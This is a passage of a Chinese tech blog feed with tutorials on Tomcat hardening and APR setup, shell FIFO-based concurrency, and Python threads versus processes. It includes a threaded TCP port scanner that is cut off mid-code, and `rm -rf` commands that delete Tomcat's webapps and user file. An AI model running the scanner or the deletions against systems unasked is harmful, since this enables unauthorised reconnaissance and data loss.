<h2 id="禁用8005端口"><a href="#禁用8005端口" class="headerlink" title="禁用8005端口"></a>禁用8005端口</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim conf/server.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># telnet localhost 8005 然后输入 SHUTDOWN 就可以关闭 Tomcat，为了安全我们要禁用该功能。</span></span><br><span class="line"><span class="comment"># 禁用该端口，要说明的是： shutdown端口是Tomcat中shutdown.sh脚本执行时给操作系统发送停止信号的端口，禁用后，执行shutdown.sh并不能停掉tomcat。那有同学就问，那我要怎么停，并且问什么要禁掉呢？停可以直接停止进程。禁掉是为了安全，同时在日常自动化运维中，为了自动批量控制业务状态，都会直接控制业务进程，所以就可以禁掉。</span></span><br><span class="line"></span><br><span class="line">默认值:</span><br><span class="line">&lt;Server port=<span class="string">"8005"</span> shutdown=<span class="string">"SHUTDOWN"</span>&gt;</span><br><span class="line">修改为:</span><br><span class="line">&lt;Server port=<span class="string">"-1"</span> shutdown=<span class="string">"SHUTDOWN"</span>&gt;</span><br></pre></td></tr></table></figure>

<h2 id="关闭自动部署"><a href="#关闭自动部署" class="headerlink" title="关闭自动部署"></a>关闭自动部署</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认值:</span><br><span class="line">&lt;Host name=&quot;localhost&quot; appBase=&quot;webapps&quot;</span><br><span class="line">     unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">修改为:</span><br><span class="line">&lt;Host name=&quot;localhost&quot; appBase=&quot;webapps&quot;</span><br><span class="line">     unpackWARs=&quot;false&quot; autoDeploy=&quot;false&quot; reloadable=&quot;false&quot;&gt;</span><br><span class="line">     </span><br><span class="line"># 在tomcat8版本中配置 reloadable=&quot;false&quot; 选项启动时会包如下警告可忽略：</span><br><span class="line">警告 [main] org.apache.tomcat.util.digester.SetPropertiesRule.begin [SetPropertiesRule]Server/Service/Engine/Host&#125; Setting property &apos;reloadable&apos; to &apos;false&apos; did not find a matching property.</span><br></pre></td></tr></table></figure>

<h2 id="线程池限制"><a href="#线程池限制" class="headerlink" title="线程池限制"></a>线程池限制</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认为注释:</span><br><span class="line">&lt;!--</span><br><span class="line">&lt;Executor name=&quot;tomcatThreadPool&quot; namePrefix=&quot;catalina-exec-&quot;</span><br><span class="line">maxThreads=&quot;150&quot; minSpareThreads=&quot;4&quot;/&gt;</span><br><span class="line">--&gt;</span><br><span class="line">修改为:</span><br><span class="line">&lt;Executor</span><br><span class="line">   name=&quot;tomcatThreadPool&quot;</span><br><span class="line">   namePrefix=&quot;catalina-exec-&quot;</span><br><span class="line">   maxThreads=&quot;500&quot;</span><br><span class="line">   minSpareThreads=&quot;100&quot; </span><br><span class="line">   maxIdleTime=&quot;60000&quot;</span><br><span class="line">  prestartminSpareThreads = &quot;true&quot;</span><br><span class="line">  maxQueueSize = &quot;100&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line"></span><br><span class="line">maxThreads：最大并发数，默认设置 200，一般建议在 500 ~ 800，根据硬件设施和业务来判断</span><br><span class="line">minSpareThreads：Tomcat 初始化时创建的线程数，默认设置 25</span><br><span class="line">maxIdleTime：如果当前线程大于初始化线程，那空闲线程存活的时间，单位毫秒，默认60000=60秒=1分钟。</span><br><span class="line">prestartminSpareThreads：在 Tomcat 初始化的时候就初始化 minSpareThreads 的参数值，如果不等于 true，minSpareThreads 的值就没啥效果了</span><br><span class="line">maxQueueSize：最大的等待队列数，超过则拒绝请求</span><br></pre></td></tr></table></figure>

<h2 id="连接器配置"><a href="#连接器配置" class="headerlink" title="连接器配置"></a>连接器配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认值：</span><br><span class="line">&lt;Connector </span><br><span class="line">   port=&quot;8080&quot; </span><br><span class="line">   protocol=&quot;HTTP/1.1&quot; </span><br><span class="line">   connectionTimeout=&quot;20000&quot; </span><br><span class="line">   redirectPort=&quot;8443&quot; </span><br><span class="line">/&gt;</span><br><span class="line">修改为：</span><br><span class="line">&lt;Connector </span><br><span class="line">  executor=&quot;tomcatThreadPool&quot;</span><br><span class="line">  port=&quot;8080&quot; </span><br><span class="line">  protocol=&quot;org.apache.coyote.http11.Http11NioProtocol&quot; </span><br><span class="line">  connectionTimeout=&quot;40000&quot; </span><br><span class="line">  maxConnections=&quot;10000&quot; </span><br><span class="line">  redirectPort=&quot;8443&quot; </span><br><span class="line">  enableLookups=&quot;false&quot; </span><br><span class="line">  acceptCount=&quot;100&quot; </span><br><span class="line">  maxPostSize=&quot;10485760&quot; </span><br><span class="line">  compression=&quot;on&quot; </span><br><span class="line">  disableUploadTimeout=&quot;true&quot; </span><br><span class="line">  compressionMinSize=&quot;2048&quot; </span><br><span class="line">  acceptorThreadCount=&quot;2&quot; </span><br><span class="line">compressableMimeType=&quot;text/html,text/xml,text/plain,text/css,text/javascript,application/javascript&quot; </span><br><span class="line">  maxHttpHeaderSize=&quot;8192&quot;</span><br><span class="line">  processorCache=&quot;20000&quot;</span><br><span class="line">  tcpNoDelay=&quot;true&quot;</span><br><span class="line">  connectionLinger=&quot;5&quot;</span><br><span class="line">  server=&quot;Server Version 11.0&quot;</span><br><span class="line">  URIEncoding=&quot;utf-8&quot;</span><br><span class="line">/&gt;</span><br><span class="line"></span><br><span class="line">用此项配置 protocol=&quot;org.apache.coyote.http11.Http11Nio2Protocol&quot;启动时会有警告可忽略</span><br><span class="line">警告 [main] org.apache.tomcat.util.net.Nio2Endpoint.bind The NIO2 connector requires an exclusive executor to operate properly on shutdown</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line"></span><br><span class="line">protocol：Tomcat 8 设置 nio2 更好：org.apache.coyote.http11.Http11Nio2Protocol（如果这个用不了，就用下面那个），Tomcat 6、7 设置 nio 更好：org.apache.coyote.http11.Http11NioProtocol</span><br><span class="line">enableLookups：禁用DNS查询</span><br><span class="line">acceptCount：指定当所有可以使用的处理请求的线程数都被使用时，可以放到处理队列中的请求数，超过这个数的请求将不予处理，默认设置 100</span><br><span class="line">maxPostSize：以 FORM URL 参数方式的 POST 提交方式，限制提交最大的大小，默认是 2097152(2兆)，它使用的单位是字节。10485760 为 10M。如果要禁用限制，则可以设置为 -1。</span><br><span class="line">maxPostSize：设置由容器解析的URL参数的最大长度，-1(小于0)为禁用这个属性，默认为2097152(2M) 请注意， FailedRequestFilter 过滤器可以用来拒绝达到了极限值的请求。</span><br><span class="line">acceptorThreadCount，用于接收连接的线程的数量，默认值是1。一般这个指需要改动的时候是因为该服务器是一个多核CPU，如果是多核 CPU 一般配置为 2.</span><br><span class="line">acceptorThreadCount：用于接受连接的线程数量。增加这个值在多CPU的机器上,尽管你永远不会真正需要超过2。 也有很多非维持连接,您可能希望增加这个值。默认值是1。</span><br><span class="line">connectionTimeout：Connector接受一个连接后等待的时间(milliseconds)，默认值是60000。</span><br><span class="line">maxConnections：这个值表示最多可以有多少个socket连接到tomcat上</span><br><span class="line">maxHttpHeaderSize：http请求头信息的最大程度，超过此长度的部分不予处理。一般8K。</span><br><span class="line">compression：是否启用GZIP压缩 on为启用（文本数据压缩） off为不启用， force 压缩所有数据</span><br><span class="line">disableUploadTimeout：这个标志允许servlet容器使用一个不同的,通常长在数据上传连接超时。 如果不指定,这个属性被设置为true,表示禁用该时间超时。</span><br><span class="line">compressionMinSize：当超过最小数据大小才进行压缩</span><br><span class="line">compressableMimeType：配置想压缩的数据类型</span><br><span class="line">URIEncoding：网站一般采用UTF-8作为默认编码。</span><br><span class="line">processorCache：协议处理器缓存的处理器对象来提高性能。 该设置决定多少这些对象的缓存。-1意味着无限的,默认是200。 如果不使用Servlet 3.0异步处理,默认是使用一样的maxThreads设置。                 如果使用Servlet 3.0异步处理,默认是使用大maxThreads和预期的并发请求的最大数量(同步和异步)。</span><br><span class="line">tcpNoDelay：如果设置为true,TCP_NO_DELAY选项将被设置在服务器套接字,而在大多数情况下提高性能。这是默认设置为true。</span><br><span class="line">connectionLinger：秒数在这个连接器将持续使用的套接字时关闭。默认值是 -1,禁用socket 延迟时间。</span><br><span class="line">server：隐藏Tomcat版本信息，首先隐藏HTTP头中的版本信息</span><br></pre></td></tr></table></figure>

<p><strong>建议：压缩会增加Tomcat负担，最好采用Nginx + Tomcat 或者 Apache + Tomcat 方式，压缩交由Nginx/Apache 去做。</strong><br><strong>Tomcat 的压缩是在客户端请求服务器对应资源后，从服务器端将资源文件压缩，再输出到客户端，由客户端的浏览器负责解压缩并浏览。相对于普通的 浏览过程 HTML、CSS、Javascript和Text，它可以节省40% 左右的流量。更为重要的是，它可以对动态生成的，包括CGI、PHP、JSP、ASP、Servlet,SHTML等输出的网页也能进行压缩，压缩效率也很高。</strong></p>
<h2 id="禁用-AJP"><a href="#禁用-AJP" class="headerlink" title="禁用 AJP"></a>禁用 AJP</h2><p><strong>前提：如果你服务器没有使用 Apache或不用ajp</strong></p>
<p>AJP是为 Tomcat 与 HTTP 服务器之间通信而定制的协议，能提供较高的通信速度和效率。如果tomcat前端放的是apache的时候，会使用到AJP这个连接器。 默认是开启的。如果不使用apache，注释该连接器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">把下面这一行注释掉，默认 Tomcat 是开启的。</span><br><span class="line">&lt;!-- &lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt; --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="隐藏或修改版本号"><a href="#隐藏或修改版本号" class="headerlink" title="隐藏或修改版本号"></a>隐藏或修改版本号</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/tomcat/lib/</span><br><span class="line">unzip catalina.jar</span><br><span class="line"><span class="built_in">cd</span> org/apache/catalina/util</span><br><span class="line">vim ServerInfo.properties</span><br><span class="line"></span><br><span class="line">server.info=Apache Tomcat/8.5.16</span><br><span class="line">server.number=8.5.16.0</span><br><span class="line">server.built=Jun 21 2017 17:01:09 UTC</span><br><span class="line"><span class="comment"># 将以上去掉或修改版本号即可。</span></span><br></pre></td></tr></table></figure>

<h2 id="管理页面安全"><a href="#管理页面安全" class="headerlink" title="管理页面安全"></a>管理页面安全</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -rf /usr/<span class="built_in">local</span>/apache-tomcat-8.5.16/webapps/*</span><br><span class="line">rm -rf /usr/<span class="built_in">local</span>/apache-tomcat-8.5.16/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>容器化</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat优化之APR模式</title>
    <url>/articles/98d7cf0b.html</url>
    <content><![CDATA[<h2 id="APR模式介绍"><a href="#APR模式介绍" class="headerlink" title="APR模式介绍"></a>APR模式介绍</h2><p>Tomcat可以使用APR来提供超强的可伸缩性和性能，更好地集成本地服务器技术。APR(Apache Portable Runtime)是一个高可移植库，它是Apache HTTP Server2.x的核心。</p>
<p>APR有很多用途，包括访问高级IO功能(例如sendfile,epoll和OpenSSL)，OS级别功能(随机数生成，系统状态等等)，本地进程管理(共享内存，NT管道和UNIXsockets)。这些功能可以使Tomcat作为一个通常的前台WEB服务器，能更好地和其它本地web技术集成，总体上让Java更有效率作为一个高性能web服务器平台而不是简单作为后台容器。</p>
<p>在产品环境中，特别是直接使用Tomcat做WEB服务器的时候，应该使用Tomcat Native来提高其性能。就是如何  在Tomcat中使用JNI的方式来读取文件以及进行网络传输。这个东西可以大大提升Tomcat对静态文件的处理性能，同时如果你使用了HTTPS方式  传输的话，也可以提升SSL的处理性能。</p>
<a id="more"></a>

<h2 id="APR模式配置"><a href="#APR模式配置" class="headerlink" title="APR模式配置"></a>APR模式配置</h2><h4 id="获取APR组件依赖包"><a href="#获取APR组件依赖包" class="headerlink" title="获取APR组件依赖包"></a>获取APR组件依赖包</h4><p>首先需要下载APR的三个依赖包 <a href="http://apr.apache.org/download.cgi" target="_blank" rel="noopener">官方下载地址</a> </p>
<p><img src="/articles/98d7cf0b/1.png" alt></p>
<p>然后把包上传到服务器。</p>
<h4 id="编译安装各个组件"><a href="#编译安装各个组件" class="headerlink" title="编译安装各个组件"></a>编译安装各个组件</h4><h6 id="安装相关环境包"><a href="#安装相关环境包" class="headerlink" title="安装相关环境包"></a>安装相关环境包</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install cmake gcc expat-devel</span><br></pre></td></tr></table></figure>

<h6 id="安装apr"><a href="#安装apr" class="headerlink" title="安装apr"></a>安装apr</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -xzvf apr-1.7.0.tar.gz</span><br><span class="line">cd apr-1.7.0</span><br><span class="line">./configure --prefix=/usr/local/apr</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<h6 id="安装apr-iconv"><a href="#安装apr-iconv" class="headerlink" title="安装apr-iconv"></a>安装apr-iconv</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xzvf apr-iconv-1.2.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> apr-iconv-1.2.2</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/apr-iconv --with-apr=/usr/<span class="built_in">local</span>/apr</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<h6 id="安装apr-util"><a href="#安装apr-util" class="headerlink" title="安装apr-util"></a>安装apr-util</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xzvf apr-util-1.6.1.tar.gz</span><br><span class="line"><span class="built_in">cd</span> apr-util-1.6.1</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/apr-util --with-apr=/usr/<span class="built_in">local</span>/apr --with-apr-iconv=/usr/<span class="built_in">local</span>/apr-iconv/bin/apriconv</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<h6 id="安装Tomcat-native"><a href="#安装Tomcat-native" class="headerlink" title="安装Tomcat-native"></a>安装Tomcat-native</h6><p>两种方式获取安装包：1，<a href="http://tomcat.apache.org/download-native.cgi" target="_blank" rel="noopener">从官方网站下载</a>；2，Tomcat中就包含该安装包，目录在: tomcat_home/bin/下。本教程采用第二种。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd tomcat_home/bin</span><br><span class="line">tar -zxvf tomcat-native.tar.gz</span><br><span class="line">cd tomcat-native-1.2.23-src/native/</span><br><span class="line">./configure  --with-apr=/usr/local/apr </span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>如有报错，openssl版本过低，需要大于1.0.2版本的，如下图</p>
<p><img src="/articles/98d7cf0b/2.png" alt></p>
<p>在<a href="https://www.openssl.org/source/" target="_blank" rel="noopener">openssl官方网站</a>下载。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.openssl.org/<span class="built_in">source</span>/openssl-1.0.2t.tar.gz</span><br><span class="line">tar xzvf openssl-1.0.2t.tar.gz</span><br><span class="line"><span class="built_in">cd</span> openssl-1.0.2t</span><br><span class="line">./config --prefix=/usr/<span class="built_in">local</span>/openssl  –fPIC <span class="comment">#加上-fPIC参数,否则编译native的时候会报错</span></span><br><span class="line">./config -t</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>安装成功openssl后再次编译还是报错，说明没找到，可以添加绝对路径编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure  --with-apr=/usr/<span class="built_in">local</span>/apr --with-ssl=/usr/<span class="built_in">local</span>/openssl</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<h6 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=/usr/<span class="built_in">local</span>/apr/lib <span class="comment">##添加apr path</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>

<h4 id="修改tomcat配置文件"><a href="#修改tomcat配置文件" class="headerlink" title="修改tomcat配置文件"></a>修改tomcat配置文件</h4><h6 id="修改protocol值"><a href="#修改protocol值" class="headerlink" title="修改protocol值"></a>修改protocol值</h6><p>Tomcat默认是HTTP/1.1，如果运行apr模式需要把protocol值修改成apr模式：<strong>org.apache.coyote.http11.Http11AprProtocol</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim server.xml</span></span><br><span class="line"></span><br><span class="line">&lt;Connector port=<span class="string">"8080"</span> protocol=<span class="string">"org.apache.coyote.http11.Http11AprProtocol"</span></span><br></pre></td></tr></table></figure>

<h6 id="修改SSLEngine"><a href="#修改SSLEngine" class="headerlink" title="修改SSLEngine"></a>修改SSLEngine</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim server.xml</span></span><br><span class="line"></span><br><span class="line">&lt;Listener className=<span class="string">"org.apache.catalina.core.AprLifecycleListener"</span> SSLEngine=<span class="string">"off"</span> /&gt;</span><br></pre></td></tr></table></figure>

<h2 id="启动tomcat验证"><a href="#启动tomcat验证" class="headerlink" title="启动tomcat验证"></a>启动tomcat验证</h2><p><img src="/articles/98d7cf0b/3.png" alt></p>
]]></content>
      <categories>
        <category>容器化</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>shell中的多进程并发</title>
    <url>/articles/d7c52fa4.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>日常工作中编写shell脚本处理事务，很多时候需要一次性处理很多，需要用到循环，但是循环体内还是线性的，还是要一个个处理，这样并不会节省很多时间，只是节省了人工一次次输入的繁琐。但是对于提高处理能力，没有实质性的提高。这就需要考虑并发。但Shell中并没有真正意义的多线程，要实现多线程可以启动多个后端进程，最大程度利用cpu性能。即：多进程并发，本篇教程由浅入深详细介绍了shell中的多进程并发。</p>
<a id="more"></a>

<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>所谓的多进程只不过是将多个任务放到后台执行而已，很多人都用到过，所以现在讲的主要是控制，而不是实现。</p>
<h4 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h4><p>先看一个小shell：</p>
<p><img src="/articles/d7c52fa4/1.jpg" alt></p>
<p>看执行结果：</p>
<p><img src="/articles/d7c52fa4/2.jpg" alt></p>
<p>很明显是8s，这种不占处理器却有很耗时的进程，我们可以通过一种后台运行的方式<br>来达到节约时间的目的。</p>
<h4 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h4><p>如下为改进：</p>
<p><img src="/articles/d7c52fa4/3.jpg" alt="img"></p>
<p>用“{}”将主执行程序变为一个块，用&amp;放入后台，四次执行全部放入后台后，我们需要用一个wait指令，等待所有后台进程执行结束，不然 系统是不会等待的，直接继续执行后续指令，知道整个程序结束。<br>看结果：</p>
<p><img src="/articles/d7c52fa4/4.jpg" alt="img"> </p>
<p>可以看到，时间已经大大缩短了！</p>
<h4 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h4><p>以上实验虽然达到了多线程并发的目的，但有一个缺陷，不能控制运行在后台的进程数。为了控制进程，我们引入了管道 和文件操作符。</p>
<p>无名管道： 就是我们经常使用的 例如： cat text | grep “abc”   那个“|”就是管道，只不过是无名的，可以直接作为两个进程的数据通道<br>有名管道： mkfilo  可以创建一个管道文件 ，例如： mkfifo　fifo_file</p>
<p>管道有一个特点，如果管道中没有数据，那么取管道数据的操作就会停滞，直到管道内进入数据，然后读出后才会终止这一操作，同理，写入管道的操作，如果没有读取操作，这一个动作也会停滞。</p>
<p><img src="/articles/d7c52fa4/5.jpg" alt="img"> </p>
<p>当我们试图用echo想管道文件中写入数据时，由于没有任何进程在对它做读取操作，所以它会一直停留在那里等待读取操作，此时我们在另一终端上用cat指令做读取操作</p>
<p><img src="/articles/d7c52fa4/6.jpg" alt="img"> </p>
<p>你会发现读取操作一旦执行，写入操作就可以顺利完成了，同理，先做读取操作也是一样的：<br><img src="/articles/d7c52fa4/7.jpg" alt="img"> </p>
<p>由于没有管道内没有数据，所以读取操作一直滞留在那里等待写入的数据<br><img src="/articles/d7c52fa4/8.jpg" alt></p>
<p>一旦有了写入的数据，读取操作立刻顺利完成</p>
<p>以上实验，看以看到，仅仅一个管道文件似乎很难实现 我们的目的（控制后台线程数),  所以 接下来介绍 文件操作符，这里只做简单的介绍，如果不熟悉的可以自行查阅资料。<br>系统运行起始，就相应设备自动绑定到了 三个文件操作符   分别为 0  1  2 对应 stdin ，stdout， stderr 。<br>在 /proc/self/fd 中 可以看到 这三个三个对应文件</p>
<p><img src="/articles/d7c52fa4/9.jpg" alt="img"> </p>
<p>输出到这三个文件的内容都会显示出来。只是因为显示器作为最常用的输出设备而被绑定。</p>
<p>我们可以exec 指令自行定义、绑定文件操作符，文件操作符一般从3–（n-1）都可以随便使用<br>此处的n 为 ulimit -n 的定义值得<br><img src="/articles/d7c52fa4/10.jpg" alt="img"> </p>
<p>可以看到 我的 n值为1024 ，所以文件操作符只能使用 0-1023，可自行定义的 就只能是 3-1023 了。</p>
<p>直接上代码，然后根据代码分析每行代码的含义：<br><img src="/articles/d7c52fa4/11.jpg" alt="img"> </p>
<p><strong>代码解释</strong></p>
<p>第3行：  接受信号 2 （ctrl +C）做的操作。exec 1000&gt;&amp;-和exec 1000&lt;&amp;- 是关闭fd1000的意思，我们生成做绑                定时 可以用 exec 1000&lt;&gt;testfifo 来实现，但关闭时必须分开来写，&gt; 读的绑定，&lt; 标识写的绑定  &lt;&gt; 则                标识 对文件描述符 1000的所有操作等同于对管道文件testfifo的操作。</p>
<p>第5-7行：分别为 创建管道文件，文件操作符绑定，删除管道文件<br>　　　　  可能会有疑问，为什么不能直接使用管道文件呢？　<br>　　　　  事实上，这并非多此一举，刚才已经说明了管道文件的一个重要特性了，那就是读写必须同时存在<br>　　　　  缺少某一种操作，另一种操作就是滞留，而绑定文件操作符　正好解决了这个问题。</p>
<p>第9-12 行： 对文件操作符进行写入操作。通过一个for循环写入10个空行，这个10就是我们要定义的后台线程数                     量。<br>                     为什么写入空行而不是10个字符呢 ？<br>                     这是因为，管道文件的读取 是以行为单位的。<br><img src="/articles/d7c52fa4/12.jpg" alt="img"><br>                      当我们试图用 read 读取管道中的一个字符时，结果是不成功的，而刚才我们已经证实使用cat是可以                      读取的。</p>
<p>第17-24行：这里假定我们有100个任务，我们要实现的时 ，保证后台只有10个进程在同步运行 。read -u1000 的                     作用是：读取一次管道中的一行，在这儿就是读取一个空行。减少操作附中的一个空行之后，执行一                     次任务（当然是放到后台执行），需要注意的是，这个任务在后台执行结束以后会向文件操作符中写                    入一个空行，这就是重点所在，如果我们不在某种情况某种时刻向操作符中写入空行，那么结果就                    是：在后台放入10个任务之后，由于操作符中没有可读取的空行，导致  read -u1000 这儿 始终停顿。</p>
<p>后边的 就不用解释了。</p>
<p>贴下执行结果：<br><img src="/articles/d7c52fa4/13.jpg" alt="img"> </p>
<p>每次的停顿中都能看到  只有10个进程在运行<br>一共耗时50s  一共100个任务，每次10个 ，每个5s 正好50s。上边的结果图之所以这么有规律，这是因为我们所执行的100个任务耗时都是相同的。</p>
<p>比如，系统将第一批10个任务放入后台的过程所消耗的时间 几乎可以忽略不计，也就是说这10个任务几乎可以任务是同时运行，当然也就可以认为是同时结束了，而按照刚才的分析，一个任务结束时就会向文件描述符写入空行，既然是同时结束的，那么肯定是同时写入的空行，所以下一批任务又几乎同时运行，如此循环下去的。实际应用时，肯定不是这个样子的，比如，第一个放到后台执行的任务，是最耗时间的，那他肯定就会是最后一个执行完毕。所以，实际上来说，只要有一个任务完成，那么下一个任务就可以被放到后台并发执行了。  </p>
<h2 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">trap</span> <span class="string">"exec 1000&gt;&amp;-;exec 1000&lt;&amp;-;exit 0"</span> 2</span><br><span class="line"></span><br><span class="line">mkfifo testfifo</span><br><span class="line"><span class="built_in">exec</span> 1000&lt;&gt;testfifo</span><br><span class="line">rm -fr testfifo</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>((n=1;n&lt;=10;n++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> &gt;&amp;1000</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">start=`date <span class="string">"+%s"</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>((i=1;i&lt;=100;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">read</span> -u1000</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"success <span class="variable">$i</span>"</span>;</span><br><span class="line">        sleep 5</span><br><span class="line"></span><br><span class="line">        <span class="built_in">echo</span> &gt;&amp;1000</span><br><span class="line">    &#125;&amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"></span><br><span class="line">end=`date <span class="string">"+%s"</span>`</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Time: `expr <span class="variable">$end</span> - <span class="variable">$start</span>`"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 1000&gt;&amp;-</span><br><span class="line"><span class="built_in">exec</span> 1000&lt;&amp;-</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程积累</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Python多进程和多线程效率最优选</title>
    <url>/articles/4efb4de8.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>通过实例实验，比较用多线程和多进程耗时情况，并进行总结归纳，选择效率最高的方法。</p>
<a id="more"></a>

<h2 id="多线程和多进程测试"><a href="#多线程和多进程测试" class="headerlink" title="多线程和多进程测试"></a>多线程和多进程测试</h2><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
<li>python3.6</li>
<li>threading和multiprocessing</li>
<li>四核+三星250G-850-SSD</li>
</ul>
<p>自从用多进程和多线程进行编程,一致没搞懂到底谁更快。网上很多都说python多进程更快，因为GIL(全局解释器锁)。但是我在写代码的时候，测试时间却是多线程更快，所以这到底是怎么回事？最近再做分词工作，原来的代码速度太慢，想提速，所以来探求一下有效方法(文末有代码和效果图)</p>
<p>这里先来一张程序的结果图，说明线程和进程谁更快</p>
<p><img src="/articles/4efb4de8/1.png" alt></p>
<h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">并行是指两个或者多个事件在同一时刻发生。并发是指两个或多个事件在同一时间间隔内发生</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">线程是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一个程序的执行实例就是一个进程。</span><br></pre></td></tr></table></figure>

<h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>而python里面的多线程显然得拿到GIL,执行code，最后释放GIL。所以由于GIL，多线程的时候拿不到，实际上，它是并发实现，即多个事件，在同一时间间隔内发生。</p>
<p>但进程有独立GIL，所以可以并行实现。因此，针对多核CPU，理论上采用多进程更能有效利用资源。</p>
<h4 id="现实问题"><a href="#现实问题" class="headerlink" title="现实问题"></a>现实问题</h4><p>在网上的教程里面，经常能见到python多线程的身影。比如网络爬虫的教程、端口扫描的教程。</p>
<p>这里拿端口扫描来说，大家可以用多进程实现下面的脚本，会发现python多进程更快。那么不就是和我们分析相悖了吗？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,threading</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">host = <span class="string">"127.0.0.1"</span> <span class="keyword">if</span> len(sys.argv)==<span class="number">1</span> <span class="keyword">else</span> sys.argv[<span class="number">1</span>]</span><br><span class="line">portList = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>)]</span><br><span class="line">scanList = []</span><br><span class="line">lock = threading.Lock()</span><br><span class="line">print(<span class="string">'Please waiting... From '</span>,host)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scanPort</span><span class="params">(port)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tcp = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">        tcp.connect((host,port))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            print(<span class="string">'[+]port'</span>,port,<span class="string">'open'</span>)</span><br><span class="line">            lock.release()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span 